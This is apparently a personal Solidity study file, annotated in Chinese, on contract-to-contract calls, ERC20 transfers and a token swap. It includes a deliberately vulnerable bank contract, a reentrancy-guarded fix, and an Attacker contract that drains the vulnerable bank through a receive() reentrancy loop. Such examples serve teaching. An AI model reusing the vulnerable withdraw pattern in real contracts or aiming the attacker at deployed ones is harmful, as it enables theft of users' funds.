// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// 合约间调用
contract Call {
    // 接口调用（interface）：IERC20 public token; constructor(address _token) { token = IERC20(_token); }
    // ！！！token = IERC20(_token);   这种类型转换的效果：当前合约给某个地址转账 或 某个地址给当前合约转账
    // 核心作用：接口绑定 - 这行代码实际上是在做两件事：1.地址到接口的转换（address → interface） 2.创建接口实例，用于调用目标合约的功能
    // 实际效果 - 转换后，token 变量具备了：1.类型安全性 - 编译器知道它有 IERC20 的方法 2.调用能力 - 可以调用目标合约的 ERC20 函数 3.地址封装 - 内部存储了目标合约地址
    // 
    // 为什么优先使用接口调用：类型安全，代码可读性好
    // token = IERC20(_token);   这个是编译器自动创建一个IERC20接口实现，还是用的之前IERC20自己已经创建的实现 - 结论：用的我们自己已经实现好的合约实现
    // 1. 这一行代码：不是创建新实现，而是类型转换，即将_address转换为IERC20接口类型 - 这相当于告诉编译器：把 _token 这个地址指向的合约当作 IERC20 接口来使用
    // 2. 工作原理：
    // address _token = 0x123...abc;  // 一个普通的地址
    // 转换为IERC20接口
    // IERC20 tokenContract = IERC20(_token);
    // 现在可以调用接口方法
    // tokenContract.transfer(to, amount);
    // ！！！实际上调用的是 0x123...abc 地址上部署的合约的transfer函数
    // 3. 底层发生了什么？
    // 编译器会生成类似这样的低级调用：
    // (bool success, bytes memory data) = _token.call(
    //    abi.encodeWithSignature("transfer(address,uint256)", to, amount)
    // );
    // IERC20(_token) 只是提供了一个类型安全的包装
    // 4. 完整的示例场景：合约A：定义接口、合约B：代币实现、合约C：使用接口 - 这里 _tokenAddress 必须是实际部署的 MyToken 合约地址，不是创建新的，而是"引用"已存在的合约
    // TokenUser.token = IERC20(0x111...); // ！！！这只是告诉编译器："0x111...这个合约实现了IERC20接口"，并没有创建新的合约
    // 5. 重要特性：接口不存储实现代码 - ！！！转换只是"承诺"目标合约有这个函数，运行时才会实际调用；运行时检查 - 编译通过（因为接口转换不验证），但调用时会失败，会revert或返回false；多个合约可以共享同一接口
    // 6.1.总结：token = IERC20(_token); 的意思是：
    // 没有创建新合约 - 零Gas成本、只是类型转换 - 告诉编译器如何调用、引用现有合约 - 假设该地址有对应实现、运行时验证 - 实际调用时才检查函数是否存在
    // 6.2 总结：token = IERC20(_token); 的意思是：- ECR20是同质化代币标准
    // ！！！_token 是代币合约的地址（address 类型）、IERC20(_token) 将这个地址转换为 IERC20 接口实例、token 变量现在是一个可以调用 ERC20 方法的接口对象、底层它仍然存储着相同的合约地址，但通过接口抽象提供了类型安全和便捷的方法调用




    // 底层调用方法：call - 发送以太币，修改状态|执行上下文被调用合约|msg.sender调用者合约、！！！delegatecall代理/委托调用 - 委托执行|执行上下文调用者合约|msg.sender原始合约 - 存储布局要求兼容、staticcall - 只读查询|执行上下文被调用合约|msg.sender调用者合约
    // ！！！理解执行上下文：call/static call - storage存储在被调用者合约中、msg.sender为调用者合约（随着调用者而变）；delegatecall - storage存储在代理/调用者合约中、msg.sender为原始合约（保持不变）
    // 合约创建方式：new - Token newToken = new Token(name, supply);、create2高级应用 - Token newToken = new Token{salt: salt}(name, supply);
    // 安全的外部调用：重入攻击防范 - CEI模式之先更新，再发送；防护措施 - 检查-效果-交互模式、使用重入锁、限制Gas、检查返回值
    // 实际使用场景：代币交换合约 - 使用接口调用ERC20函数，实现代币的交换和转移；多签钱包 - 使用call执行外部交易，确保多重签名验证；代理合约 - 使用delegatecall转发调用，实现合约升级和功能扩展

    // 前提：approve
    // token.transferFrom(msg.sender, address(this), amount) 是 DeFi 和 DApp 的核心操作，实现了：合约控制用户资产（需预先授权）、安全的资金托管、自动化交易执行 - 使用前用户必须先 approve，否则交易会失败！
    // token.transferFrom(msg.sender, address(this), amount) 是 ERC20代币转账的标准操作，用于从他人账户向当前合约转账
    // msg.sender - 付款方：函数调用者、address(this) - 收款方：当前智能合约、amount - 金额：转账数量

    // 多合约间调用：Defi去中心化项目中：1、借贷协议可能需要调用价格预言机，获取一个实时价格，进行一个比对 2、调用ERC20代币合约进行一个资金转移 3、调用流动性池，进行一个清算
    // Java：初级、中级、高级 - 技术、业务、管理（都算中级）- 以后排除管理
    // Web3：
    // 业务逻辑合约、外部合约 - ERC20代币合约、代理合约

    // 先明确一个问题：账户地址有两种：一种是外部账户地址（即具体某一个人的账户地址）、一种是智能合约账户地址（即具体某一个智能合约的账户地址，区别于某一个人的账户地址）。两种账户地址都能存放代币
    // 举个例子：进行1账户地址A代币 与 2账户地址B代币进行转换的过程：即先把1账户地址A代币，转给某智能合约，然后1账户授权给某智能合约，最后智能合约把自己拥有的B代币，转给2账户地址
    // 外部账户地址：0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
    // 合约账户地址：0xBc45c34fA3Eb75589fF3455Bd2d9410464205041

    // 关键要点：优先使用接口调用、始终考虑安全性、理解执行上下文
    // 理解的时候：把智能合约 和 账户地址分开，各是各的
}

// 定义ERC20接口
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// 简单的ERC20实现 - ！状态变量都存储在被调用合约中
contract SimpleToken is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    constructor() {
        _balances[msg.sender] = 1000000 * 10**18;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(_balances[msg.sender] >= amount, "Insufficient balance"); // ！msg.sender为函数调用者（此处是代币交换合约账户调用，即合约地址）
        _balances[msg.sender] -= amount;
        _balances[to] += amount;
        return true;
    }
    
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        _allowances[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(_allowances[from][msg.sender] >= amount, "Insufficient allowance"); // ！msg.sender为函数调用者（此处是代币交换合约账户调用，即合约地址）
        require(_balances[from] >= amount, "Insufficient balance");
        
        _allowances[from][msg.sender] -= amount;
        _balances[from] -= amount;
        _balances[to] += amount;
        return true;
    }
}

// 代币交换合约（使用接口调用）- 即实际为：代币交换合约在 A、B 合约中都有一个账户，用户 A、B 代币的转换
// 即A合约的一个账号，给A合约中的代币交换合约账户转入10个A币；然后从B合约的代币交换合约账户转出10个B币，给B合约的一个账号
// 即A合约和B合约都有一个中转账户，即代币交换合约账户
contract TokenSwap {
    IERC20 public tokenA;
    IERC20 public tokenB;
    
    event Swap(address indexed user, uint256 amountA, uint256 amountB);
    
    constructor(address _tokenA, address _tokenB) {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }
    
    function swap(uint256 amountA) external {
        // 使用接口调用，类型安全
        require(tokenA.transferFrom(msg.sender, address(this), amountA), "Transfer A failed"); // ！此处少一个前提：approve；msg.sender为函数调用者（此处是外部账户调用，即外部账号地址）
        
        uint256 amountB = amountA; // 简化的1:1兑换
        require(tokenB.transfer(msg.sender, amountB), "Transfer B failed");
        
        emit Swap(msg.sender, amountA, amountB);
    }
}

// 存在重入漏洞的合约
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // 危险！存在重入漏洞
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // 先转账，后更新状态 - 这是错误的顺序！
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;
    }
}

// 安全的银行合约
contract SecureBank {
    mapping(address => uint256) public balances;
    bool private locked;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // 安全的提现函数
    function withdraw() external noReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // 检查-效果-交互模式：先更新状态
        balances[msg.sender] = 0;
        
        // 再进行外部调用
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, amount);
    }
}

// 攻击合约
contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;
    
    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }
    
    // 接收以太币时触发重入攻击
    receive() external payable {
        if (attackCount < 3 && address(vulnerableBank).balance > 0) {
            attackCount++;
            vulnerableBank.withdraw();
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        attackCount = 0;
        
        // 先存款
        vulnerableBank.deposit{value: msg.value}();
        
        // 发起攻击
        vulnerableBank.withdraw();
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// receive() external payable {} = 合约的支付宝/微信收款码，贴上就能收钱！
// 你的代码就是最基础的版本，让合约具备了接收 ETH 的能力。实际项目中通常会添加更多逻辑（如记录、验证、事件等）。
// receive() external payable {}：这是合约的"收款码"，让合约能接收别人直接转来的 ETH
// 1、基本用法：
// 最简单的接收ETH方式
// receive() external payable {
//     // 当别人向合约地址直接转账ETH时执行
//     // 例：在钱包里输入合约地址，转1 ETH
// }
// 2、方式对比表
// 转账方式	                触发哪个函数？	    示例
// 直接转ETH，无数据	    receive()	        合约地址.transfer(1 ETH)
// 转账+调用不存在的函数	fallback()	        合约.call{value:1 ETH}("hello")
// 转账+调用存在的函数	    对应函数（需payable）	合约.donate{value:1 ETH}()

// 代币交换合约、？多签钱包（重入锁）、？代理合约、？create2工厂